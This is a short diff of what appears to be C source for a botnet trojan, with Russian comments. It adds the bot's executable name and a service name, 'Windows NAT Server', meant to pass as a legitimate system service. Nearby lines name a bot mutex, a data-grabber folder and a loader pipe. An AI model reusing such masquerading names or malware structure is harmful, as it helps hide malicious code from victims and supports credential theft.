@@ -52,6 +52,17 @@ CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
 
 CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
 
+
+// Оригинальное имя ехе файла бота
+CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";
+
+// Оригинальное имя ехе файла сервиса бота
+//CSSTR EStrOriginalBotServiceExeName[] = "WnJtkBts.exe";
+
+// Имя сервиса
+CSSTR EStrServiceName[] = "Windows NAT Server";
+
+
 // Рабочии директории и файлы
 CSSTR StrBotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
 CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
@@ -59,6 +70,7 @@ CSSTR StrGrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
 // Имена служебный пайпов
 CSSTR EStrPipeLoader[] = "ldrspp"; // Имя служебного пайпа лоадера
+
 
 
 // Служебные команды, передаваемые через пайпы процессам
